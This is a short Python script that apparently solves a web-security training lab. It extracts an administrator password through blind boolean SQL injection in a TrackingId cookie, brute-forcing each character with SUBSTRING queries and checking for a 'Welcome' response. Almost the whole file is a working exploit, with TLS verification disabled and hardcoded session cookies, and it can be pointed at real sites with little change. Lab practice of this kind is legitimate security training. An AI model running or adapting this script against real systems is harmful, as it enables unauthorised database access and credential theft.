import urllib3
import urllib
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://acc41f151e428737c0aa498900b5009d.web-security-academy.net/"
password = ""
# myProxies = {'http': 'http://172.25.80.1:8080', 'https': 'https://172.25.80.1:8080'}

print("Bruteforcing the password...")

for i in range(1,21):
    for j in range(32,126):
        char = chr(j)
        sys.stdout.write('\r' + char)
        sys.stdout.flush()
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{char}"
        payloadEncoded = urllib.parse.quote(payload)
        pageCookies = {'TrackingId': 'J5WpKuMs6EhDxRD9' + payloadEncoded, 'session': 'skuuYxy5wsVZYdQwKJJZ3biExllIWcJD'}
        req = requests.get(url, cookies=pageCookies, verify=False)
        if req.status_code != 200:
            print(f"\r{req.status_code} response")
        if "Welcome" in req.text:
            password += char
            print(f" #{i} character found!")
            break

print(f"The password is: {password}")